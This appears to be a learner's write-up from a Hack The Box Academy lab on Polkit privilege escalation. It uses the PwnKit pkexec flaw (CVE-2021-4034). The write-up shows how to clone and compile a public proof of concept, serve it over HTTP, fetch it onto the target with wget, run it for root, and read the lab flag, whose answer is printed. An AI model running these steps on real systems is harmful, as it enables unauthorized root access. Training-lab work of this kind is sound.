---
description: >-
  an authorization service on Linux-based operating systems that allows user
  software and system components to communicate with each other if the user
  software is authorized to do so.
---

# Polkit

Polkit works with two groups of files.

1. actions/policies (`/usr/share/polkit-1/actions`)
2. rules (`/usr/share/polkit-1/rules.d`)

Polkit also has `local authority` rules which can be used to set or remove additional permissions for users and groups. Custom rules can be placed in the directory `/etc/polkit-1/localauthority/50-local.d` with the file extension `.pkla`.

PolKit also comes with three additional programs:

* `pkexec` - runs a program with the rights of another user or with root rights
* `pkaction` - can be used to display actions
* `pkcheck` - this can be used to check if a process is authorized for a specific action

```shell-session
cry0l1t3@nix02:~$ # pkexec -u <user> <command>
cry0l1t3@nix02:~$ pkexec -u root id

uid=0(root) gid=0(root) groups=0(root)
```

In the `pkexec` tool, the memory corruption vulnerability with the identifier [CVE-2021-4034](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-4034) was found, also known as [Pwnkit](https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034) and also leads to privilege escalation.

```shell-session
cry0l1t3@nix02:~$ git clone https://github.com/arthepsy/CVE-2021-4034.git
cry0l1t3@nix02:~$ cd CVE-2021-4034
cry0l1t3@nix02:~$ gcc cve-2021-4034-poc.c -o poc
```

we can execute it without further ado. After the execution, we change from the standard shell (`sh`) to Bash (`bash`) and check the user's IDs.

## Assessment

Escalate the privileges and submit the contents of flag.txt as the answer.

**On attack machine**

```
┌──(kali㉿kali)-[~/Desktop/htb_academy/pri_esc_linux]
└─$ git clone https://github.com/arthepsy/CVE-2021-4034.git
Cloning into 'CVE-2021-4034'...
remote: Enumerating objects: 18, done.
remote: Counting objects: 100% (4/4), done.
remote: Compressing objects: 100% (4/4), done.
remote: Total 18 (delta 2), reused 0 (delta 0), pack-reused 14
Receiving objects: 100% (18/18), 4.79 KiB | 1.20 MiB/s, done.
Resolving deltas: 100% (3/3), done.
                                                                                                                    
┌──(kali㉿kali)-[~/Desktop/htb_academy/pri_esc_linux]
└─$ cd CVE-2021-4034
                                                                                                                    
┌──(kali㉿kali)-[~/Desktop/htb_academy/pri_esc_linux/CVE-2021-4034]
└─$ gcc cve-2021-4034-poc.c -o poc -static
                                                                                                                    
┌──(kali㉿kali)-[~/Desktop/htb_academy/pri_esc_linux/CVE-2021-4034]
└─$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.129.205.113 - - [17/Jul/2023 03:38:50] "GET /poc HTTP/1.1" 200 -

```

**On target machine**

```
htb-student@ubuntu:~$ wget http://10.10.14.5:8000/poc
--2023-07-17 07:38:51--  http://10.10.14.5:8000/poc
Connecting to 10.10.14.5:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 772592 (754K) [application/octet-stream]
Saving to: ‘poc’

poc                          100%[==============================================>] 754.48K   384KB/s    in 2.0s    

2023-07-17 07:38:53 (384 KB/s) - ‘poc’ saved [772592/772592]

htb-student@ubuntu:~$ chmod +x poc
htb-student@ubuntu:~$ ./poc
# id
uid=0(root) gid=0(root) groups=0(root),1001(htb-student)
# bash
root@ubuntu:/home/htb-student# cat /root/flag.txt 
HTB{p0Lk1tt3n}

```



